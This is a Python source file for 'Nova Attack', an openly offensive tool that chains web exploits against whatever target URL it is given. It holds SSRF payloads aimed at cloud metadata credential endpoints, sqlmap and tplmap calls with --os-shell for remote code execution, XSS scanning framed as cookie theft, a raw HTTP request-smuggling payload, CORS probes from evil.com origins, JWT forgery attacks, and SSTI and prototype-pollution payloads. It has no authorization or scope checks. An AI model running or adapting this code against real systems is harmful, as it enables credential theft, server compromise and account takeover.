#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║   ⚡ NOVA ATTACK v1.0 — ADVANCED ATTACK CHAIN ORCHESTRATOR      ║
║                                                                  ║
║   Chains multiple attack techniques into compound exploits:     ║
║                                                                  ║
║   Web chains:                                                    ║
║   • SSRF → AWS metadata → credential exfiltration              ║
║   • CORS + credential request → account takeover               ║
║   • HTTP smuggling → cache poisoning → XSS                     ║
║   • SQLi → auth bypass → admin panel RCE                       ║
║   • Open redirect → OAuth hijack                               ║
║   • Subdomain takeover → cookie stealing                       ║
║   • XXE → SSRF → internal network scan                         ║
║                                                                  ║
║   Each chain is LLM-guided and adapts to what it discovers.    ║
╚══════════════════════════════════════════════════════════════════╝
"""

import json
import os
import re
import subprocess
import sys
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin

WORKSPACE = os.path.expanduser("~/nova_workspace")
NOVA_BIN  = os.path.join(WORKSPACE, "bin")
GOPATH    = os.path.join(WORKSPACE, "go")


class AttackResult:
    def __init__(self, name: str, success: bool, severity: str = "info",
                 payload: str = "", evidence: str = "", url: str = ""):
        self.name     = name
        self.success  = success
        self.severity = severity
        self.payload  = payload
        self.evidence = evidence
        self.url      = url

    def to_finding(self) -> Dict:
        return {
            "name":     self.name,
            "severity": self.severity,
            "payload":  self.payload,
            "evidence": self.evidence[:500],
            "url":      self.url,
            "tool":     "nova_attack",
            "type":     self.name,
        }


class NovaAttack:

    def __init__(self, target: str, verbose: bool = False, reasoning_core=None):
        self.target         = target.rstrip("/")
        self.domain         = self._extract_domain(target)
        self.verbose        = verbose
        self.reasoning_core = reasoning_core
        self.findings: List[AttackResult] = []
        self._env = self._build_env()

    def _extract_domain(self, url: str) -> str:
        try:
            p = urlparse(url)
            return p.netloc or url
        except Exception:
            return url

    def _build_env(self) -> Dict:
        env = dict(os.environ)
        paths = [NOVA_BIN, "/usr/local/go/bin", os.path.join(GOPATH, "bin"),
                 os.path.expanduser("~/.local/bin")]
        env["PATH"]   = ":".join(paths) + ":" + env.get("PATH", "")
        env["GOPATH"] = GOPATH
        env["GOBIN"]  = NOVA_BIN
        return env

    def _run(self, cmd: str, timeout: int = 60) -> Tuple[int, str, str]:
        if self.verbose:
            print(f"    $ {cmd[:100]}")
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                               timeout=timeout, env=self._env, cwd=WORKSPACE)
            return r.returncode, r.stdout[:5000], r.stderr[:1000]
        except subprocess.TimeoutExpired:
            return 1, "", "timeout"
        except Exception as e:
            return 1, "", str(e)

    def _has(self, tool: str) -> bool:
        import shutil
        path = os.path.join(NOVA_BIN, tool)
        return (os.path.isfile(path) and os.access(path, os.X_OK)) or \
               bool(shutil.which(tool, path=self._env.get("PATH")))

    def _http(self, url: str, method: str = "GET", headers: Dict = None,
               data: str = None, timeout: int = 10) -> Tuple[int, str, str]:
        try:
            import urllib.request
            req = urllib.request.Request(url, method=method)
            req.add_header("User-Agent", "Mozilla/5.0 Nova/1.0")
            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)
            if data:
                req.data = data.encode()
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(50000).decode("utf-8", errors="replace")
                hdrs = dict(resp.headers)
                return resp.status, body, json.dumps(hdrs)
        except Exception as e:
            return 0, "", str(e)

    # ── ATTACK CHAINS ─────────────────────────────────────────────

    def chain_ssrf_to_metadata(self, urls_with_params: List[Dict]) -> List[AttackResult]:
        """SSRF → cloud metadata credential extraction chain."""
        print(f"  ⚡ [Attack] SSRF → metadata chain")
        results = []
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://169.254.169.254/metadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://[::ffff:169.254.169.254]/latest/meta-data/",
            "http://0x7f000001/latest/meta-data/",
            "http://2130706433/latest/meta-data/",
            "dict://169.254.169.254:80/",
            "gopher://169.254.169.254:80/",
        ]
        if self._has("ssrfmap"):
            for item in urls_with_params[:5]:
                url = item.get("url","")
                param = item.get("param","url")
                _, out, _ = self._run(
                    f"ssrfmap -r {url} -p {param} -m readfiles,networkscan 2>/dev/null",
                    timeout=30,
                )
                if "AWS" in out or "iam" in out or "credential" in out.lower():
                    results.append(AttackResult("SSRF to AWS Metadata", True, "critical",
                                                url=url, evidence=out[:200]))
        else:
            # Manual probe
            for item in urls_with_params[:10]:
                url = item.get("url","")
                param = item.get("param","url")
                for payload in ssrf_payloads[:3]:
                    test_url = f"{url}?{param}={payload}"
                    code, body, _ = self._http(test_url)
                    if any(kw in body for kw in ["ami-id","instance-id","AccessKeyId","Token"]):
                        results.append(AttackResult("SSRF to Cloud Metadata", True, "critical",
                                                    payload=payload, url=test_url, evidence=body[:200]))
                        break
        if results:
            self.findings.extend(results)
        return results

    def chain_sqli_to_rce(self, target_urls: List[str]) -> List[AttackResult]:
        """SQLi discovery → privilege escalation → OS RCE chain."""
        print(f"  ⚡ [Attack] SQLi → RCE chain")
        results = []
        if not self._has("sqlmap"):
            return results

        for url in target_urls[:3]:
            rc, out, _ = self._run(
                f"sqlmap -u '{url}' --batch --level=3 --risk=2 --random-agent "
                f"--technique=BEUSTQ --dbs --os-shell 2>/dev/null",
                timeout=90,
            )
            if "os-shell" in out.lower() or "command standard output" in out.lower():
                results.append(AttackResult("SQLi to OS RCE", True, "critical",
                                            url=url, evidence=out[-300:]))
            elif "[CRITICAL]" in out or "injectable" in out.lower():
                results.append(AttackResult("SQL Injection", True, "high",
                                            url=url, evidence=out[-200:]))

        self.findings.extend(results)
        return results

    def chain_xss_to_account_takeover(self, xss_params: List[Dict]) -> List[AttackResult]:
        """XSS discovery → session cookie theft → account takeover."""
        print(f"  ⚡ [Attack] XSS → account takeover chain")
        results = []
        if not self._has("dalfox"):
            return results

        for item in xss_params[:5]:
            url = item.get("url","")
            rc, out, _ = self._run(
                f"dalfox url '{url}' --silence --skip-bav --format json 2>/dev/null",
                timeout=40,
            )
            if out.strip():
                try:
                    data = json.loads(out)
                    for finding in (data if isinstance(data, list) else [data]):
                        if finding.get("type") == "V":
                            results.append(AttackResult(
                                "XSS to Account Takeover", True, "high",
                                payload=finding.get("payload",""),
                                url=url,
                                evidence=f"XSS confirmed — cookie theft possible: {finding.get('payload','')[:100]}",
                            ))
                except Exception:
                    if "[V]" in out or "VULN" in out:
                        results.append(AttackResult("Reflected XSS", True, "high", url=url))

        self.findings.extend(results)
        return results

    def chain_http_smuggling(self) -> List[AttackResult]:
        """HTTP request smuggling detection and exploitation."""
        print(f"  ⚡ [Attack] HTTP smuggling chain")
        results = []

        if self._has("smuggler"):
            rc, out, _ = self._run(
                f"smuggler -u {self.target} --quiet 2>/dev/null",
                timeout=60,
            )
            if "Found" in out or "VULNERABLE" in out.upper():
                results.append(AttackResult("HTTP Request Smuggling", True, "critical",
                                            url=self.target, evidence=out[:300]))

        if self._has("h2csmuggler"):
            rc, out, _ = self._run(
                f"h2csmuggler --wordlist /dev/null {self.target} 2>/dev/null",
                timeout=30,
            )
            if "vulnerable" in out.lower():
                results.append(AttackResult("H2C Smuggling", True, "high",
                                            url=self.target, evidence=out[:200]))

        # Manual CL.TE probe
        if not results:
            results.extend(self._probe_clte_smuggling())

        self.findings.extend(results)
        return results

    def _probe_clte_smuggling(self) -> List[AttackResult]:
        """Manual CL.TE desync probe."""
        import socket
        try:
            p = urlparse(self.target)
            host = p.hostname
            port = p.port or (443 if p.scheme == "https" else 80)

            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: close\r\n\r\n"
                f"0\r\n\r\nG"
            )
            t1 = time.time()
            s = socket.create_connection((host, port), timeout=5)
            s.send(request.encode())
            s.recv(4096)
            s.close()
            elapsed1 = time.time() - t1

            t2 = time.time()
            s = socket.create_connection((host, port), timeout=5)
            s.send(request.encode())
            s.recv(4096)
            s.close()
            elapsed2 = time.time() - t2

            # CL.TE timing heuristic: second request is slower if smuggling exists
            if elapsed2 > elapsed1 * 1.5 and elapsed2 > 3:
                return [AttackResult("HTTP Smuggling (CL.TE timing)", True, "high",
                                     url=self.target,
                                     evidence=f"Timing delta: {elapsed1:.1f}s vs {elapsed2:.1f}s")]
        except Exception:
            pass
        return []

    def chain_cors_to_takeover(self) -> List[AttackResult]:
        """CORS misconfiguration → credential theft → account takeover."""
        print(f"  ⚡ [Attack] CORS → account takeover chain")
        results = []

        if self._has("corsy"):
            rc, out, _ = self._run(
                f"corsy -u {self.target} -q 2>/dev/null",
                timeout=30,
            )
            if "vulnerable" in out.lower() or "CORS" in out:
                results.append(AttackResult("CORS Misconfiguration → Takeover", True, "high",
                                            url=self.target, evidence=out[:200]))
        else:
            # Manual probe
            evil_origins = [
                "https://evil.com",
                f"https://{self.domain}.evil.com",
                "null",
                "https://evil" + self.target.replace("https://","").replace("http://",""),
            ]
            for origin in evil_origins:
                code, body, hdrs = self._http(
                    self.target + "/api/",
                    headers={"Origin": origin, "Cookie": "test=1"}
                )
                try:
                    h = json.loads(hdrs)
                    acao = h.get("access-control-allow-origin","")
                    acac = h.get("access-control-allow-credentials","")
                    if (acao == origin or acao == "*") and "true" in acac.lower():
                        results.append(AttackResult("CORS with Credentials", True, "high",
                                                    url=self.target,
                                                    evidence=f"Origin {origin} accepted with credentials",
                                                    payload=f"Origin: {origin}"))
                        break
                except Exception:
                    pass

        self.findings.extend(results)
        return results

    def chain_jwt_attacks(self, endpoints: List[str] = None) -> List[AttackResult]:
        """JWT algorithm confusion, none attack, key confusion."""
        print(f"  ⚡ [Attack] JWT attack chain")
        results = []
        targets = endpoints or [self.target + "/api/"]

        if self._has("jwt_tool"):
            for ep in targets[:5]:
                # Try to capture a JWT from the endpoint
                code, body, hdrs = self._http(ep)
                token = None
                try:
                    h = json.loads(hdrs)
                    auth = h.get("authorization","") or h.get("set-cookie","")
                    # Extract JWT pattern
                    jwt_match = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', body + auth)
                    if jwt_match:
                        token = jwt_match.group(0)
                except Exception:
                    pass

                if token:
                    for attack in ["-X a", "-X n", "-X b", "-X s"]:
                        rc, out, _ = self._run(
                            f"jwt_tool {token} {attack} -q 2>/dev/null",
                            timeout=15,
                        )
                        if "VALID" in out or "Success" in out:
                            attack_name = {"a":"Algorithm Confusion","n":"None Algorithm","b":"JWKS Injection","s":"Embedded JWK"}.get(attack.split()[-1],"JWT Attack")
                            results.append(AttackResult(f"JWT {attack_name}", True, "critical",
                                                        url=ep, evidence=out[:200], payload=token[:50]))
                            break

        self.findings.extend(results)
        return results

    def chain_prototype_pollution(self, urls: List[str] = None) -> List[AttackResult]:
        """Client-side prototype pollution detection."""
        print(f"  ⚡ [Attack] Prototype pollution chain")
        results = []
        targets = urls or [self.target]

        payloads = [
            "__proto__[test]=nova",
            "constructor[prototype][test]=nova",
            "__proto__.test=nova",
        ]

        for url in targets[:5]:
            for payload in payloads:
                test_url = f"{url}?{payload}"
                code, body, hdrs = self._http(test_url)
                if '"test":"nova"' in body or "'test':'nova'" in body:
                    results.append(AttackResult("Prototype Pollution", True, "high",
                                                url=test_url, payload=payload,
                                                evidence=body[:100]))
                    break

        self.findings.extend(results)
        return results

    def chain_ssti(self, params: List[Dict]) -> List[AttackResult]:
        """Server-Side Template Injection detection and RCE."""
        print(f"  ⚡ [Attack] SSTI → RCE chain")
        results = []

        if self._has("tplmap"):
            for item in params[:5]:
                url = item.get("url","")
                param = item.get("param","")
                rc, out, _ = self._run(
                    f"tplmap -u '{url}' -p '{param}' --os-shell 2>/dev/null",
                    timeout=40,
                )
                if "code execution" in out.lower() or "os-shell" in out.lower():
                    results.append(AttackResult("SSTI to RCE", True, "critical",
                                                url=url, evidence=out[:200]))
        else:
            # Manual SSTI probes
            ssti_payloads = [
                ("{{7*7}}", "49"),
                ("${7*7}", "49"),
                ("<%= 7*7 %>", "49"),
                ("#{7*7}", "49"),
                ("*{7*7}", "49"),
                ("{{config}}", "SECRET"),
                ("{{''.__class__.__mro__[1].__subclasses__()}}", "class"),
            ]
            for item in params[:10]:
                url = item.get("url","")
                param = item.get("param","")
                for payload, expected in ssti_payloads:
                    import urllib.parse
                    from urllib.parse import urlencode, urlparse, parse_qs
                    try:
                        p = urlparse(url)
                        qs = parse_qs(p.query)
                        qs[param] = [payload]
                        new_qs = "&".join(f"{k}={urllib.parse.quote(v[0])}" for k, v in qs.items())
                        test_url = f"{p.scheme}://{p.netloc}{p.path}?{new_qs}"
                        code, body, _ = self._http(test_url)
                        if expected in body:
                            results.append(AttackResult("Server-Side Template Injection", True, "critical",
                                                        url=test_url, payload=payload, evidence=body[:100]))
                            break
                    except Exception:
                        pass

        self.findings.extend(results)
        return results

    def run_all_chains(self, recon_data: Dict = None) -> List[Dict]:
        """Run all attack chains using recon data."""
        print(f"\n  ⚡ Nova Attack — Running all chains on {self.target}\n")

        urls       = (recon_data or {}).get("urls", [self.target])
        params     = (recon_data or {}).get("interesting_urls", [])
        endpoints  = (recon_data or {}).get("endpoints", [])
        live_hosts = [(h.get("url","")) for h in (recon_data or {}).get("live_hosts", [])]

        url_params = params[:20] if params else [{"url": self.target + "/?q=test", "param": "q"}]

        self.chain_ssrf_to_metadata(url_params)
        self.chain_cors_to_takeover()
        self.chain_http_smuggling()
        self.chain_jwt_attacks(endpoints)
        self.chain_ssti(url_params)
        self.chain_sqli_to_rce(urls[:3])
        self.chain_xss_to_account_takeover(url_params)
        self.chain_prototype_pollution(urls[:5])

        findings = [f.to_finding() for f in self.findings]
        print(f"\n  ⚡ Attack chains complete: {len(findings)} findings")
        return findings


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="⚡ Nova Attack Chain Orchestrator")
    parser.add_argument("target",   help="Target URL")
    parser.add_argument("--chain",  choices=["ssrf","sqli","xss","smuggling","cors","jwt","ssti","all"],
                        default="all")
    parser.add_argument("--recon",  help="Path to recon JSON from nova_recon.py")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    recon_data = {}
    if args.recon and os.path.exists(args.recon):
        with open(args.recon) as f:
            recon_data = json.load(f)

    attacker = NovaAttack(args.target, verbose=args.verbose)

    if args.chain == "all":
        findings = attacker.run_all_chains(recon_data)
    elif args.chain == "ssrf":
        findings = [f.to_finding() for f in attacker.chain_ssrf_to_metadata(
            recon_data.get("interesting_urls", [{"url": args.target, "param": "url"}]))]
    elif args.chain == "smuggling":
        findings = [f.to_finding() for f in attacker.chain_http_smuggling()]
    elif args.chain == "jwt":
        findings = [f.to_finding() for f in attacker.chain_jwt_attacks()]
    elif args.chain == "ssti":
        findings = [f.to_finding() for f in attacker.chain_ssti(
            [{"url": args.target, "param": "q"}])]
    else:
        findings = []

    print(json.dumps(findings, indent=2))
